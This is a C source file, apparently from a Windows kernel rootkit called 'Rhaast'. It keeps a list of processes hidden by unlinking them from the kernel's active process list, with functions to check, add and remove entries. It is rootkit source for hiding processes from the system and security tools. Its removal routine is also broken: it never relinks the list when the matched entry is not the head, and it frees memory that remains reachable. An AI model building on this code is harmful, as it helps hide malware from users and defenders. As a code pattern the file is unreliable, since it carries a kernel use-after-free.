#include <Rhaast.h>

/**
 * @brief
 *      Check if the specified process is already hidden
 *
 * @param Pid
 *      Process id to check
 *
 * @return
 *      if process is already hidden 
 */
BOOLEAN PsListHiddenCheck(
    _In_ ULONG Pid
) {
    BOOLEAN        Found = FALSE;
    PPSHIDDEN_LIST List  = NULL;

    /* get list */
    List = Instance.PsHiddenList;

    /* iterate over list */
    do
    {
        if ( ! List ) {
            break; 
        }

        /* check if found */
        if ( List->Pid == Pid ) {
            Found = TRUE;
            break;
        }

        /* get next entry */
        List = List->Next;
    } while ( TRUE ); 

    List = NULL;

    return Found;
}

/**
 * @brief
 *      add a process to the hidden list
 *
 * @param Pid 
 *      Pid of hidden process
 *
 * @param ProcessEntry
 *      LIST_ENTRY of hidden process that was from EPROCESS.ActiveProcessLinks
 *
 * @return
 *      execution status of function 
 */
NTSTATUS PsListHiddenAdd(
    _In_ ULONG		 Pid,
    _In_ PLIST_ENTRY ProcessEntry
) {
    PPSHIDDEN_LIST PsHidden = NULL;
    NTSTATUS	   NtStatus = STATUS_SUCCESS;

    /* allocate memory for linked list object */
    if ( ! ( PsHidden = RsMemAlloc( sizeof( PSHIDDEN_LIST ) ) ) ) {
        PRINTF( "ExAllocatePool2 Failed" );
        NtStatus = STATUS_UNSUCCESSFUL;
        goto END;
    }

    /* set hidden process data */
    PsHidden->Pid          = Pid;
    PsHidden->ProcessEntry = ProcessEntry;
    PsHidden->Next         = Instance.PsHiddenList;

    /* insert it into the global instance */
    Instance.PsHiddenList = PsHidden; 

    PRINTF( "PsHidden.Next = %p\n", PsHidden->Next ); 

END:
    return NtStatus;
}

/**
 * @brief
 *      Removes & free process entry list from internal list
 *      and retrieves the pointer of EPROCESS.ActiveProcessLinks
 *      entry of the process from list.
 *
 * @param Pid
 *      process id to remove from list
 *
 * @param ProcessEntry
 *      sets EPROCESS.ActiveProcessLinks entry pointer
 *      of hidden process into the param
 */
NTSTATUS PsListHiddenRemove(
    _In_  ULONG        Pid,
    _Out_ PLIST_ENTRY* ProcessEntry
) {
    NTSTATUS       NtStatus  = STATUS_INVALID_PARAMETER;
    PPSHIDDEN_LIST PshdEntry = NULL;
    PPSHIDDEN_LIST PshdLast  = NULL;

    if ( ! ProcessEntry ) {
        goto END; 
    }

    /* set linked lists */
    PshdEntry = Instance.PsHiddenList;

    do {
        if ( ! PshdEntry ) {
            break; 
        }
        
        /* search hidden process */
        if ( PshdEntry->Pid == Pid ) 
        {
            /* adjust linked list */
            if ( ! PshdLast ) {
                Instance.PsHiddenList = PshdEntry->Next;
            }

            /* set process entry list */
            *ProcessEntry = PshdEntry->ProcessEntry;

            /* free memory */
            RtlSecureZeroMemory( PshdEntry, sizeof( PSHIDDEN_LIST ) );
            RsMemFree( PshdEntry );

            /* set status as successful */
            NtStatus = STATUS_SUCCESS;

            break;
        }        
        
        PshdLast  = PshdEntry;
        PshdEntry = PshdEntry->Next;
    } while ( TRUE );
    
END:
    PshdLast = PshdEntry = NULL; 

    return NtStatus; 
}